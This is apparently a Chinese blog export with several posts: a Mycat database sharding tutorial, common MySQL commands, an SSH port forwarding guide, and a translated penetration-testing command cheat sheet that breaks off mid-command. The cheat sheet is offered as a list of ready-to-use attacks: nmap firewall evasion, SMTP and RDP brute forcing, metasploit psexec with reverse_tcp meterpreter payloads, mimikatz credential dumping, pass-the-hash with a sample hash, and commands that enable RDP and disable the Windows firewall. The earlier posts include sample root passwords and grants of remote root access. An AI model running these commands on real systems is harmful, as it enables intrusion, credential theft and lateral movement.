操作基本可以数据库做。 不存在单库大数据，高并发的性能瓶颈。 应用端改造较少。 提高了系统的稳定性跟负载能力。 缺点： 拆分规则难以抽象。 分片事务一致性难以解决。 数据多次扩展难度跟维护量极大。 跨库 join 性能较差。 共同特点缺点 引入分布式事务的问题 跨节点 Join 的问题 跨节点合并排序分页问题 多数据源管理问题 介绍完两种切分方式，我们就可以根据自己的业务需求来选择，接下来我们通过中间件来进行数据的切分 0x01 分库分表中间件MycatMycat它是一个开源的分布式数据库系统， 强大的数据库中间件，实现了 MySQL 协议的的Server,前端用户可以把它看作是一个数据库代理，用 MySQL 客户端工具和命令行访问，而其后端可以用MySQL 原生（Native）协议与多个 MySQL 服务器通信，也可以用 JDBC 协议与大多数主流数据库服务器通信，其核心功能是分表分库，即将一个大表水平分割为 N 个小表，存储在后端 MySQL 服务器里或者其他数据库里。 实验机器环境：CentOS6.8(2台), JDK8, Mycat1.6, MySql5.1.73 12server1 192.168.1.214 mysqlserver2 192.168.1.216 mycat JDK 1. 安装MycatMycat依赖java环境，所以要安装jdk，这里直接使用yum -y install java 安装java环境 如果需要jps, jmap等命令则执行yum -y install java-devel 下载Mycat 1234567#执行在server2mkdir -p /usr/local/mycat &amp;&amp; cd /usr/local/mycatwget -c -t5 -O Mycat-1.6.tar.gz "http://dl.mycat.io/1.6-RELEASE/Mycat-server-1.6-RELEASE-20161028204710-linux.tar.gz"tar xvf Mycat-1.6.tar.gz -C ./ 我们来大概看一下Mycat的目录结构： 123456789101112131415.├── bin│ ├── mycat Mycat启动程序│ ├── ...├── catlet├── conf │ ├── log4j2.xml 日志的配置 根据自己的需要可以调整输出级别为debug│ ├── rule.xml 分片规则的配置文件，分片规则的具体参数信息单独存放为文件，也在当前目录，配置文件修改需要重启MyCAT。│ ├── schema.xml 逻辑库定义和表以及分片定义的配置文件。│ ├── server.xml Mycat服务器参数调整和用户授权的配置文件。│ ├── wrapper.conf JVM内存配置文件│ ├── zkconf Zookeeper配置目录├── lib MyCAT自身的jar包或依赖的jar包的存放目录。├── logs MyCAT日志的存放目录。日志存放在logs/log中，每天一个文件。└── version.txt 版本信息 2. 配置配置Mycat服务器参数编辑Mycat服务器参数调整和用户授权的配置文件vim conf/server.xml(配置文件中有注释)首先备份一份，cp conf/server.xml conf/server.xml.bak跳转到文件尾部编辑如下 12345678910111213141516171819202122232425262728293031323334&lt;!--此处定义的用户，为Client连接Mycat的用户密码，可以配置相关数据库及表读写的权限，--&gt; &lt;user name="root"&gt; &lt;property name="password"&gt;test&lt;/property&gt; &lt;property name="schemas"&gt;TESTDB&lt;/property&gt; &lt;!--&lt;property name="readOnly"&gt;true&lt;/property&gt;--&gt; &lt;/user&gt; &lt;!-- 表级 DML 权限设置 --&gt; &lt;!-- &lt;privileges check="false"&gt; &lt;schema name="TESTDB" dml="0110" &gt; &lt;table name="tb01" dml="0000"&gt;&lt;/table&gt; &lt;table name="tb02" dml="1111"&gt;&lt;/table&gt; &lt;/schema&gt; &lt;/privileges&gt; --&gt;&lt;!--此处定义连接IP白名单和 SQL 黑名单--&gt; &lt;!-- 全局SQL防火墙设置 --&gt; &lt;!-- &lt;firewall&gt; &lt;whitehost&gt; &lt;host user="mycat" host="127.0.0.1"&gt;&lt;/host&gt; ip 白名单 用户对应的可以访问的 ip 地址 &lt;/whitehost&gt; &lt;blacklist check="true"&gt; &lt;property name="selelctAllow"&gt;false&lt;/property&gt; 黑名单允许的 权限 后面为默认 &lt;/blacklist&gt; &lt;/firewall&gt; --&gt;# 配置逻辑库表，分片定义编辑逻辑库定义和表以及分片定义的配置文件vim conf/schema.xml同样先备份一份cp conf/schema.xml conf/schema.xml.bak编辑为如下内容 有如下表结构： 12345678910111213+--------------------+-------+------------------------+--------------------+| ID | LEVEL | EXTEND_ATTR | UID |+--------------------+-------+------------------------+--------------------+| 298599220716244992 | 1 | &#123;&#125; | 298321762779664384 || 298600412901019648 | 0 | &#123;&#125; | 298321762779664384 || 298682157746884608 | 3 | &#123;"129":2&#125; | 298667788531142656 || 298684200884637696 | 2 | &#123;&#125; | 298667788531142656 || 298685806279659520 | 2 | &#123;&#125; | 298667788531142656 || 298686594007699456 | 2 | &#123;&#125; | 298667788531142656 || 298687219567169536 | 2 | &#123;&#125; | 298667788531142656 || 298688215626289152 | 1 | &#123;&#125; | 298667788531142656 || 298689820996145152 | 1 | &#123;&#125; | 298667788531142656 |+--------------------+-------+------------------------+--------------------+ 这里选择根据UID进行水平切分，配置文件如下： 123456789101112131415161718192021222324&lt;?xml version="1.0"?&gt;&lt;!DOCTYPE mycat:schema SYSTEM "schema.dtd"&gt;&lt;mycat:schema xmlns:mycat="http://io.mycat/"&gt; &lt;!--定义逻辑数据库TESTDB，逻辑表t_rune,主键、切分规则(mod-long)，和数据库节点(dn2,dn2,dn3)--&gt; &lt;schema name="TESTDB" checkSQLschema="false" sqlMaxLimit="100"&gt; &lt;table name="t_rune" primaryKey="uid" dataNode="dn2,dn2,dn3" rule="mod-long" &gt; &lt;/table&gt; &lt;/schema&gt; &lt;!--定义每个数据库节点相关信息--&gt; &lt;dataNode name="dn2" dataHost="server1" database="db1" /&gt; &lt;dataNode name="dn2" dataHost="server1" database="db2" /&gt; &lt;dataNode name="dn3" dataHost="server1" database="db3" /&gt; &lt;!--等同于以上配置&lt;dataNodename=“dn$1-3” dataHost=“server1” database=“db$1-3”/&gt; --&gt; &lt;!--定义主机信息，及Mysql用户密码--&gt; &lt;dataHost name="server1" maxCon="1000" minCon="10" balance="0" writeType="0" dbType="mysql" dbDriver="native" switchType="1" slaveThreshold="100"&gt; &lt;!--心跳检测语句--&gt; &lt;heartbeat&gt;select user()&lt;/heartbeat&gt; &lt;!-- 远程数据库配置信息 --&gt; &lt;writeHost host="192.168.99.21" url="192.168.99.214:3306" user="root" password="root"&gt; &lt;/writeHost&gt; &lt;/dataHost&gt;&lt;/mycat:schema&gt; 无论分片与否,每张表都需要定义, 生产,例: 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263&lt;?xml version="1.0"?&gt;&lt;!DOCTYPE mycat:schema SYSTEM "schema.dtd"&gt;&lt;mycat:schema xmlns:mycat="http://io.mycat/"&gt; &lt;schema name="bigduck" checkSQLschema="true" sqlMaxLimit="100"&gt; &lt;!--分--&gt; &lt;!--t_shop_visible--&gt; &lt;table name="t_shop_visible" primaryKey="ID" dataNode="dn$1-15" rule="mod-long"&gt; &lt;/table&gt; &lt;!--t_friendlog--&gt; &lt;table name="t_friendlog" primaryKey="ID" dataNode="dn$1-15" rule="mod-long"&gt; &lt;/table&gt; &lt;!--t_room--&gt; &lt;table name="t_room" primaryKey="ID" dataNode="dn$1-15" rule="mod-long"&gt; &lt;/table&gt; &lt;!--t_npc--&gt; &lt;table name="t_npc" primaryKey="ID" dataNode="dn$1-15" rule="mod-long"&gt; &lt;/table&gt; &lt;!--t_arena_fight--&gt; &lt;table name="t_arena_fight" primaryKey="ID" dataNode="dn$1-15" rule="mod-long"&gt; &lt;/table&gt; &lt;!--不分--&gt; &lt;!--alliance_id--&gt; &lt;table name="alliance_id" primaryKey="seq_id" dataNode="dn2"&gt; &lt;/table&gt; &lt;!--t_alliance_boss--&gt; &lt;table name="t_alliance_boss" primaryKey="ALLIANCEID" dataNode="dn2"&gt; &lt;/table&gt; &lt;!--t_alliance_boss_id--&gt; &lt;table name="t_alliance_boss_id" primaryKey="ALLIANCEID" dataNode="dn2"&gt; &lt;/table&gt; &lt;!--t_alliance_boss_log--&gt; &lt;table name="t_alliance_boss_log" primaryKey="ID" dataNode="dn2"&gt; &lt;/table&gt; &lt;!--t_alliance_member_boss--&gt; &lt;table name="t_alliance_member_boss" primaryKey="UID" dataNode="dn2"&gt; &lt;/table&gt; &lt;!-- global table is auto cloned to all defined data nodes ,so can join with any table whose sharding node is in the same data node --&gt; &lt;!--全局表--&gt; &lt;!--t_arena--&gt; &lt;table name="t_arena" primaryKey="UID" type="global" dataNode="dn2"&gt; &lt;/table&gt; &lt;/schema&gt; &lt;dataNode name="dn$1-5" dataHost="mysql-server-01" database="db$11-15" /&gt; &lt;dataNode name="dn$6-10" dataHost="mysql-server-02" database="db$21-25" /&gt; &lt;dataNode name="dn$11-15" dataHost="mysql-server-03" database="db$31-35" /&gt; &lt;dataHost name="mysql-server-01" maxCon="2000" minCon="100" balance="0" dbType="mysql" dbDriver="native"&gt; &lt;heartbeat&gt;select user()&lt;/heartbeat&gt; &lt;writeHost host="172.17.0.2" url="172.17.0.2:3306" user="root" password="pa33w0rd"&gt; &lt;/writeHost&gt; &lt;/dataHost&gt; &lt;dataHost name="mysql-server-02" maxCon="2000" minCon="100" balance="0" dbType="mysql" dbDriver="native"&gt; &lt;heartbeat&gt;select user()&lt;/heartbeat&gt; &lt;writeHost host="172.17.0.3" url="172.17.0.3:3306" user="root" password="pa33w0rd"&gt; &lt;/writeHost&gt; &lt;/dataHost&gt; &lt;dataHost name="mysql-server-03" maxCon="2000" minCon="100" balance="0" dbType="mysql" dbDriver="native"&gt; &lt;heartbeat&gt;select user()&lt;/heartbeat&gt; &lt;writeHost host="172.17.0.4" url="172.17.0.4:3306" user="root" password="pa33w0rd"&gt; &lt;/writeHost&gt; &lt;/dataHost&gt;&lt;/mycat:schema&gt; 配置切片规则在上步的schema.xml文件中定义了分片规则：rule=&quot;mod-long&quot;此时编辑conf/rule.xml文件添加分片规则的具体参数信息 123456789101112131415161718192021222324252627 &lt;tableRule name="mod-long"&gt; &lt;rule&gt; &lt;columns&gt;uid&lt;/columns&gt; &lt;algorithm&gt;mod-long&lt;/algorithm&gt; &lt;/rule&gt; &lt;/tableRule&gt;&lt;!-- name 属性指定唯一的名字，用于标识不同的表规则。 内嵌的 rule 标签则指定对物理表中的哪一列进行拆分和使用什么路由算法。 columns 内指定要拆分的列名字。 algorithm 使用 function 标签中的 name 属性。连接表规则和具体路由算法。当然，多个表规则可以连接到 同一个路由算法上。table 标签内使用。让逻辑表使用这个规则进行分片。--&gt; &lt;function name="mod-long" class="io.mycat.route.function.PartitionByMod"&gt; &lt;!--注意！这里填写数据库节点数，否则无法分片--&gt; &lt;property name="count"&gt;3&lt;/property&gt; &lt;/function&gt;&lt;!-- name 指定算法的名字。 class 制定路由算法具体的类名字。（此处使用求模法） property 为具体算法需要用到的一些属性。--&gt; 具体切片算法规则：Mycat切片算法规则详解 0x02 配置数据库节点配置server1数据库，用户密码为schema.xml文件中配置相同，并允许server2运程连接 12grant all privileges on *.* to 'root'@'192.168.99.216' identified by 'root' with grant option;flush privileges; 创建配置文件中数据库节点db1,db2.db3 123create database db1 character set utf8;create database db2 character set utf8;create database db3 character set utf8; 测试环境中确认2台机器防火墙关闭server iptables stop 返回到server1启动Mycat 1234567891011121314cd /usr/local/mycat./bin/mycat start[root@Centos6-8-TestEnv mycat]# netstat -ntlpActive Internet connections (only servers)Proto Recv-Q Send-Q Local Address Foreign Address State PID/Program name tcp 0 0 127.0.0.1:32000 0.0.0.0:* LISTEN 8613/java tcp 0 0 :::1984 :::* LISTEN 8613/java tcp 0 0 :::8066 :::* LISTEN 8613/java#确保8066端口监听此为Mycat服务器默认端口 tcp 0 0 :::60743 :::* LISTEN 8613/java tcp 0 0 :::43303 :::* LISTEN 8613/java tcp 0 0 :::9066 :::* LISTEN 8613/java 0x03 数据迁移编辑/etc/my.cnf添加1234[mysqldump]max_allowed_packet = 16M#default-character-set = utf8mb4 mysqldump导入报ERROR 1153 (08S01) at line 1133809: Got a packet bigger than &#39;max_allowed_packet&#39; bytes错误，因为MySQL允许的默认大小为1MB。 注意，Mycat在执行INSERT语句时需要完整INSERT语句(用列名) 123456mysqldump -uroot -p -c --skip-add-locks --skip-extended-insert --no-autocommit databaseName &gt; databaseName.sql# -c 参数不可少，-c, 全称为–complete-insert 表示使用完整的 insert 语句(用列名字)。# --skip-add-locks 表示导数据时不加锁，如果加锁涉及多分片时容易导致死锁。# --skip-extended-insert 将每行数据输出为一个单独的insert语句# --no-autocommit 参数在每个表格所有的插入语句的前后分别增加SET autocommit = 0和COMMIT语句。相比没有这个参数，插入速度能差出至少200倍，分别是10000QPS和50QPS 导入数据 123mysql -uroot -ptest -h192.168.99.216 -P8006 TESTDB #连接Mycatsource /t_rune.sql #导入数据 成功后可以在server2中看到db1,db2.db3已经存入数据。错误日志在 logs/mycat.log文件中 连接Mycat select * from table 时，Mycat默认limit 100此配置可从schema.xml文件中修改sqlMaxLimit=&quot;100&quot;定义 0x04 会用到的sql查询所有表的主键 1SELECT k.column_name,k.table_name FROM information_schema.table_constraints t JOIN information_schema.key_column_usage k USING (constraint_name,table_schema,table_name) WHERE t.constraint_type='PRIMARY KEY' AND t.table_schema='数据库'; 查询所有表的记录数(行数) 123select table_name,table_rows from information_schema.tables where TABLE_SCHEMA = '数据库' order by table_rows desc;#对于InnoDB表，table_rows行计数仅是大概估计值。]]></content>
      <categories>
        <category>数据库</category>
        <category>Mycat</category>
      </categories>
      <tags>
        <tag>Mycat</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[常用Mysql语句]]></title>
    <url>%2F2017%2F03%2F14%2Fmysql-sql%2F</url>
    <content type="text"><![CDATA[纪录运维过程常用的sql語句，备忘 创建数据库 CREATE DATABASE test CHARACTER SET UTF8; 字符集为UTF8 0x01 用戶密码及登陆相关1. 更改密码12update user set password=password('root') where user='root';flush privileges; 2. 允许远程登录12grant all privileges on *.* to 'username'@'%' identified by 'password' with grant option;flush privileges; 3. 更改Mysql监听地址123vim /etc/my.cnf#在[mysqld]中添加bind-address=127.0.0.1 4. 创建用户123grant all privileges on database.tables to 'username'@'127.0.0.1' identified by 'password' with grant option;flush privileges;# all privileges ---- 所有权限(可指定SELECT,DROP,UPDATE,INSTER....) 5. 查询所有用戶基本信息1SELECT user,host,password FROM mysql.user;?? 初始安裝数据库使用mysqladmin设置密码后，直接使用mysql -uroot -ppasswd 登陆正常，使用mysql -uroot -ppasswd -h127.0.0.1报错:Access denied for user ‘root‘@’hostname’设置允许远程登陆,仍然报错这时使用SELECT user,host,password FROM mysql.user;语句进行查询+——–+—————-+——————————————-+| root | localhost | 3E8000C2FA234A170531B9063518B3B479E7C47B || root | 127.0.0.1 | 2E9879C2FA764A1705567896B518B3B47324EA23 |+——–+—————-+——————————————-+更改為相同即可 0x02 数据增刪改查1. 批量刪除匹配的表123456789101112131415161718例：+-----------------------------+| userregin2017_03_01 || userregin2017_03_02 || userregin2017_03_03 || userregin2017_03_04 || userregin2017_03_05 || userregin2017_03_06 || userregin2017_03_07 || userregin2017_03_08 || userregin2017_03_09 || userregin2017_03_10 || userregin2017_03_11 || userregin2017_03_12 || userregin2017_03_13 |+-----------------------------+Select CONCAT( 'drop table ', table_name, ';' ) FROM information_schema.tables Where table_name LIKE 'userregin%';# 导出的数据使用vim编辑Ctrl+v(选取) &gt;&gt; Shift+i &gt;&gt; 编辑 &gt;&gt; Esc &gt;&gt; 方向键下 2. 查询数据库大小1SELECT concat((SUM(DATA_LENGTH)+SUM(INDEX_LENGTH))/1024/1024,'MB') as data FROM information_schema.tables WHERE TABLE_SCHEMA='your_database'; 3. 查询表大小1SELECT concat((SUM(DATA_LENGTH)+SUM(INDEX_LENGTH))/1024/1024,'MB') as data FROM information_schema.tables WHERE TABLE_SCHEMA='your_database' and TABLE_NAME='your_table'; 4. 查询表结构1desc your_table； 5. 查询建表语句1show create table table_name; 6. 刪除清空表数据： 123delete from table；delete from table where id=1;#带规则清除 7. 查询表中NAME字段有哪些类型1select NAME from t_user group by NAME; 0x03 备份还原压缩备份： 1mysqldump -B -uroot -proot Your_database| gzip &gt; Your_database.sql.gz 压缩还原： 1gunzip &lt; Your_database.sql.gz | mysql -uroot -proot sql文件还原： 123mysql -uroot -prootuse Your_database;source /root/Your_database.sql;]]></content>
      <categories>
        <category>Mysql</category>
      </categories>
      <tags>
        <tag>Mysql</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[SSH端口转发]]></title>
    <url>%2F2017%2F01%2F09%2Flinux-ssh%2F</url>
    <content type="text"><![CDATA[通过本文的介绍，读者可以从中了解到如何应用 SSH 端口转发机制来解决日常工作 / 生活中的一些问题。学会在非安全环境下使用端口转发来加密网络应用，保护个人隐私以及重要商业信息。同时也能够用此技术解决工作中一些常见问题，例如解决防火墙及网络应用本身带来的一些限制。 0x01 端口转发概述SSH 会自动加密和解密所有 SSH 客户端与服务端之间的网络数据。但是，SSH 还同时提供了一个非常有用的功能，这就是端口转发。它能够将其他 TCP 端口的网络数据通过 SSH 链接来转发，并且自动提供了相应的加密及解密服务。这一过程有时也被叫做隧道（tunneling），这是因为 SSH 为其他 TCP 链接提供了一个安全的通道来进行传输而得名。 例如，Telnet，SMTP，LDAP 这些 TCP 应用均能够从中得益，避免了用户名，密码以及隐私信息的明文传输。而与此同时，如果您工作环境中的防火墙限制了一些网络端口的使用，但是允许 SSH 的连接，那么也是能够通过将 TCP 端口转发来使用 SSH 进行通讯。 总的来说 SSH 端口转发能够提供两大功能： 加密 SSH Client 端至 SSH Server 端之间的通讯数据。 突破防火墙的限制完成一些之前无法建立的 TCP 连接。 0x02 本地转发 如图,我们对B机器没有操作权限，C机器欲访问B机器，但由于B机器无外网ip，所以无法访问，但A机器可以和B，C两台机器通信（有外网ip和内网ip），此时使用SSH在A机器上做SSH端口本地转发，来实现外网访问内网B机器 如果转发后监听的ip地址为0.0.0.0，则需要更改跳板机的sshd配置文件vim /etc/ssh/sshd_config更改GatewayPorts no &gt; GatewayPorts yes 在A机器执行： 123ssh -CfNgL 0.0.0.0:80:172.16.1.2:80 root@172.16.1.3 | | | | | A B C D E 这里我们来分段讲解命令的构成： A： 这里是本机转发后要监听的ip段，0.0.0.0允许所有ip访问，本机ip允许内网ip访问，127.0.0.1允许本机访问B：远程主机端口转发到本机后的端口C：要转发的远程主机ip，这里的ip地址是相对跳板机而言的D：要转发的端口E：需要执行转发的机器，即跳板机 1234567-C 压缩传输数据-f 建立SSH连接后放置后台，静默模式-N 不要执行远程命令。 这对于仅转发端口很有用（仅限协议版本2）-g 允许远程主机连接本地端口转发-L 指定本地（客户端）主机上的给定端口要转发到远程端的给定主机和端口。这通过分配一个套接字侦听本地端口， 可选绑定到指定的bind_address工作。每当与此端口建立连接时，都会通过安全通道转发连接， 并从远程机器连接到主机端口主机端口 # 记住本地转发时候用L选项就可以了 访问流程如下： 1Client(C) 访问TCP&gt; A:80 通过SSH隧道&gt; SSH(A) TCP&gt; B:80 这里做的是在A主机本地的端口转发，如果想把B机器80端口转发到在C机器的80端口 在C机器执行： 12345#ssh -CfNgL 0.0.0.0:80:172.16.1.2:80 root@172.16.1.3ssh -CfNgL 0.0.0.0:80:172.16.1.2:80 root@123.56.1.23 只需要把此ip，更换成A机器外网ip即可#ssh登陆A主机，告诉A主机，转发B主机（172.16.1.2）80端口，本机SSH与A主机建立SSH隧道转发到本机80端口#此时在A主机执行netstat -anp|grep ssh会多出来一条SSH隧道进程，这个隧道就是与C主机建立的 访问流程如下： 1Client(C) TCP&gt; C:80 通过SSH隧道&gt; SSH(A) TCP&gt; B:80 建议亲手操作去试试找下感觉！ 0x03 远程转发 如图，同样我们对C机器没有操作权限，D机器想访问C机器80端口，但是和C同一网段的机器都没有外网ip，只有A机器有外网但和C又不是一个局域网，上节我们用的本地端口转发在这里就不能使用了，此时远程端口转发出来了: ) 在B机器执行： 12345 需要转发主机的ip(C) |ssh -CNfgR 0.0.0.0:80:172.16.1.2:80 root@123.56.2.3 | | | |远程主机监听网段 远程主机监听端口 转发端口 远程主机(A) 执行如上操作，此时D访问A主机80端口就可以转发到C主机80端口B主机扮演跳板机角色 访问流程如下： 12Client(D) TCP&gt; A:80 SSH隧道&gt; B TCP&gt; C:80#有种卖队友的感觉：） 0x04 动态端口转发此方法多用于翻墙，所有端口经过SSH隧道，建立socks连接，一条命令自己体会 1ssh -qTfnN -D 7070 servername@serverIP -p sshport]]></content>
      <categories>
        <category>SSH</category>
      </categories>
      <tags>
        <tag>Foward</tag>
        <tag>SSH</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[渗透工具实战应用命令合集]]></title>
    <url>%2F2016%2F12%2F30%2Fkali-tools%2F</url>
    <content type="text"><![CDATA[本文为国外大牛总结自己在渗透测试中常用的一些小技巧。原文分为两部分，这里翻译并且总结，方便查阅。 NMAP 扫描策略12345678910111213141516171819202122232425262728# 适用所有大小网络最好的 nmap 扫描策略# 主机发现，生成存活主机列表$ nmap -sn -T4 -oG Discovery.gnmap 192.168.56.0/24$ grep "Status: Up" Discovery.gnmap | cut -f 2 -d ' ' &gt; LiveHosts.txt# 端口发现，发现大部分常用端口# http://nmap.org/presentations/BHDC08/bhdc08-slides-fyodor.pdf$ nmap -sS -T4 -Pn -oG TopTCP -iL LiveHosts.txt$ nmap -sU -T4 -Pn -oN TopUDP -iL LiveHosts.txt$ nmap -sS -T4 -Pn --top-ports 3674 -oG 3674 -iL LiveHosts.txt# 端口发现，发现全部端口，但 UDP 端口的扫描会非常慢$ nmap -sS -T4 -Pn -p 0-65535 -oN FullTCP -iL LiveHosts.txt$ nmap -sU -T4 -Pn -p 0-65535 -oN FullUDP -iL LiveHosts.txt# 显示 TCP\UDP 端口$ grep "open" FullTCP|cut -f 1 -d ' ' | sort -nu | cut -f 1 -d '/' |xargs | sed 's/ /,/g'|awk '&#123;print "T:"$0&#125;'$ grep "open" FullUDP|cut -f 1 -d ' ' | sort -nu | cut -f 1 -d '/' |xargs | sed 's/ /,/g'|awk '&#123;print "U:"$0&#125;'# 侦测服务版本$ nmap -sV -T4 -Pn -oG ServiceDetect -iL LiveHosts.txt# 扫做系统扫描$ nmap -O -T4 -Pn -oG OSDetect -iL LiveHosts.txt# 系统和服务检测$ nmap -O -sV -T4 -Pn -p U:53,111,137,T:21-25,80,139,8080 -oG OS_Service_Detect -iL LiveHosts.txt Nmap – 躲避防火墙1234567891011121314151617181920212223# 分段$ nmap -f# 修改默认 MTU 大小，但必须为 8 的倍数(8,16,24,32 等等)$ nmap --mtu 24# 生成随机数量的欺骗$ nmap -D RND:10 [target]# 手动指定欺骗使用的 IP$ nmap -D decoy1,decoy2,decoy3 etc.# 僵尸网络扫描, 首先需要找到僵尸网络的IP$ nmap -sI [Zombie IP] [Target IP]# 指定源端口号$ nmap --source-port 80 IP# 在每个扫描数据包后追加随机数量的数据$ nmap --data-length 25 IP# MAC 地址欺骗，可以生成不同主机的 MAC 地址$ nmap --spoof-mac Dell/Apple/3Com IP Nmap 进行 Web 漏洞扫描12345678cd /usr/share/nmap/scripts/wget http://www.computec.ch/projekte/vulscan/download/nmap_nse_vulscan-2.0.tar.gz &amp;&amp; tar xzf nmap_nse_vulscan-2.0.tar.gznmap -sS -sV --script=vulscan/vulscan.nse targetnmap -sS -sV --script=vulscan/vulscan.nse –script-args vulscandb=scipvuldb.csv targetnmap -sS -sV --script=vulscan/vulscan.nse –script-args vulscandb=scipvuldb.csv -p80 targetnmap -PN -sS -sV --script=vulscan –script-args vulscancorrelation=1 -p80 targetnmap -sV --script=vuln targetnmap -PN -sS -sV --script=all –script-args vulscancorrelation=1 target 使用 DIRB 爆破目录DIRB 是一个专门用于爆破目录的工具，在 Kali 中默认已经安装 1dirb http://IP:PORT /usr/share/dirb/wordlists/common.txt Patator – 全能暴力破解测试工具1234567# git clone https://github.com/lanjelot/patator.git /usr/share/patator# SMTP 爆破$ patator smtp_login host=192.168.17.129 user=Ololena password=FILE0 0=/usr/share/john/password.lst$ patator smtp_login host=192.168.17.129 user=FILE1 password=FILE0 0=/usr/share/john/password.lst 1=/usr/share/john/usernames.lst$ patator smtp_login host=192.168.17.129 helo='ehlo 192.168.17.128' user=FILE1 password=FILE0 0=/usr/share/john/password.lst 1=/usr/share/john/usernames.lst$ patator smtp_login host=192.168.17.129 user=Ololena password=FILE0 0=/usr/share/john/password.lst -x ignore:fgrep='incorrect password or account name' 使用 Fierce 爆破 DNS 注：Fierce 会检查 DNS 服务器是否允许区域传送。如果允许，就会进行区域传送并通知用户，如果不允许，则可以通过查询 DNS 服务器枚举主机名。类似工具：subDomainsBrute 和 SubBrute 等等 123# http://ha.ckers.org/fierce/$ ./fierce.pl -dns example.com$ ./fierce.pl –dns example.com –wordlist myWordList.txt 使用 Nikto 扫描 Web 服务1nikto -C all -h http://IP 扫描 WordPress12git clone https://github.com/wpscanteam/wpscan.git &amp;&amp; cd wpscan./wpscan –url http://IP/ –enumerate p HTTP 指纹识别12345wget http://www.net-square.com/_assets/httprint_linux_301.zip &amp;&amp; unzip httprint_linux_301.zipcd httprint_301/linux/./httprint -h http://IP -s signatures.txt使用 Skipfish 扫描注：Skipfish 是一款 Web 应用安全侦查工具，Skipfish 会利用递归爬虫和基于字典的探针生成一幅交互式网站地图，最终生成的地图会在通过安全检查后输出。 1skipfish -m 5 -LY -S /usr/share/skipfish/dictionaries/complete.wl -o ./skipfish2 -u http://IP 使用 NC 扫描12345nc -v -w 1 target -z 1-1000for i in &#123;101..102&#125;; do nc -vv -n -w 1 192.168.56.$i 21-25 -z; done#判断端口是否开启nc -v5 -w target port Unicornscan 注：Unicornscan 是一个信息收集和安全审计的工具。 123456us -H -msf -Iv 192.168.56.101 -p 1-65535us -H -mU -Iv 192.168.56.101 -p 1-65535-H 在生成报告阶段解析主机名-m 扫描类型 (sf - tcp, U - udp)-Iv - 详细 使用 Xprobe2 识别操作系统指纹1xprobe2 -v -p tcp:80:open IP 枚举 Samba1234nmblookup -A targetsmbclient //MOUNT/share -I target -Nrpcclient -U "" targetenum4linux target 枚举 SNMP123snmpget -v 1 -c public IPsnmpwalk -v 1 -c public IPsnmpbulkwalk -v2c -c public -Cn0 -Cr10 IP PuTTY 连接隧道12转发远程端口到目标地址plink.exe -P 22 -l root -pw "1234" -R 445:127.0.0.1:445 IP Meterpreter 端口转发123# 转发远程端口到目标地址meterpreter &gt; portfwd add –l 3389 –p 3389 –r 172.16.194.141kali &gt; rdesktop 127.0.0.1:3389 SSH 穿透123ssh -D 127.0.0.1:1080 -p 22 user@IPAdd socks4 127.0.0.1 1080 in /etc/proxychains.confproxychains commands target SSH 穿透从一个网络到另一个网络12345ssh -D 127.0.0.1:1080 -p 22 user1@IP1Add socks4 127.0.0.1 1080 in /etc/proxychains.confproxychains ssh -D 127.0.0.1:1081 -p 22 user1@IP2Add socks4 127.0.0.1 1081 in /etc/proxychains.confproxychains commands target 使用 metasploit 进行穿透123456789101112131415161718route add X.X.X.X 255.255.255.0 1use auxiliary/server/socks4arunproxychains msfcli windows/* PAYLOAD=windows/meterpreter/reverse_tcp LHOST=IP LPORT=443 RHOST=IP E或者meterpreter &gt; ipconfigIP Address : 10.1.13.3meterpreter &gt; run autoroute -s 10.1.13.0/24meterpreter &gt; run autoroute -p10.1.13.0 255.255.255.0 Session 1meterpreter &gt; Ctrl+Zmsf auxiliary(tcp) &gt; use exploit/windows/smb/psexecmsf exploit(psexec) &gt; set RHOST 10.1.13.2msf exploit(psexec) &gt; exploitmeterpreter &gt; ipconfigIP Address : 10.1.13.2 开启 RDP 服务123reg add "hklm\system\currentcontrolset\control\terminal server" /f /v fDenyTSConnections /t REG_DWORD /d 0netsh firewall set service remoteadmin enablenetsh firewall set service remotedesktop enable 关闭 Windows 防火墙1netsh firewall set opmode disable Meterpreter VNC\RDP12run getgui -u admin -p 1234run vnc -p 5043 使用 Mimikatz获取 Windows 明文用户名密码12345678910111213141516171819202122git clone https://github.com/gentilkiwi/mimikatz.gitprivilege::debugsekurlsa::logonPasswords full获取哈希值git clone https://github.com/byt3bl33d3r/pth-toolkitpth-winexe -U hash //IP cmd或者apt-get install freerdp-x11xfreerdp /u:offsec /d:win2012 /pth:HASH /v:IP在或者meterpreter &gt; run post/windows/gather/hashdumpAdministrator:500:e52cac67419a9a224a3b108f3fa6cb6d:8846f7eaee8fb117ad06bdd830b7586c:::msf &gt; use exploit/windows/smb/psexecmsf exploit(psexec) &gt; set payload windows/meterpreter/reverse_tcpmsf exploit(psexec) &gt; set SMBPass e52cac67419a9a224a3b108f3fa6cb6d:8846f7eaee8fb117ad06bdd830b7586cmsf exploit(psexec) &gt; exploitmeterpreter &gt; shell 使用 Hashcat 破解密码1hashcat -m 400 -a 0 hash /root/rockyou.txt 使用 NC 抓取 Banner 信息12345nc 192.168.0.10 80GET / HTTP/1.1Host: 192.168.0.10User-Agent: Mozilla/4.0Referrer: www.example.com 查找 SUID\SGID root 文件1234567891011121314151617# 查找 SUID root 文件find / -user root -perm -4000 -print# 查找 SGID root 文件:find / -group root -perm -2000 -print# 查找 SUID 和 SGID 文件:find / -perm -4000 -o -perm -2000 -print# 查找不属于任何用户的文件:find / -nouser -print# 查找不属于任何用户组的文件:find / -nogroup -print# 查找软连接及其指向:find / -type l -ls 获取进程对应的 PID12fuser -nv tcp 80fuser -k -n tcp 80 使用 Hydra 爆破 RDP1hydra -l admin -P /root/Desktop/passwords -S X.X.X.X rdp 挂载远程 Windows 共享文件夹1smbmount //X.X.X.X/c$ /mnt/remote/ -o username=user,password=pass,rw Kali 下编译 Exploit12gcc -m32 -o output32 hello.c (32 位)gcc -m64 -o output hello.c (64 位) Kali 下编译 Windows Exploit12345678wget -O mingw-get-setup.exe http://sourceforge.net/projects/mingw/files/Installer/mingw-get-setup.exe/downloadwine mingw-get-setup.exeselect mingw32-basecd /root/.wine/drive_c/windowswget http://gojhonny.com/misc/mingw_bin.zip &amp;&amp; unzip mingw_bin.zipcd /root/.wine/drive_c/MinGW/binwine gcc -o ability.exe /tmp/exploit.c -lwsock32wine ability.exe NASM 命令 NASM 全称 The Netwide Assembler，是一款基于80×86和x86-64平台的汇编语言编译程序，其设计初衷是为了实现编译器程序跨平台和模块化的特性。 12nasm -f bin 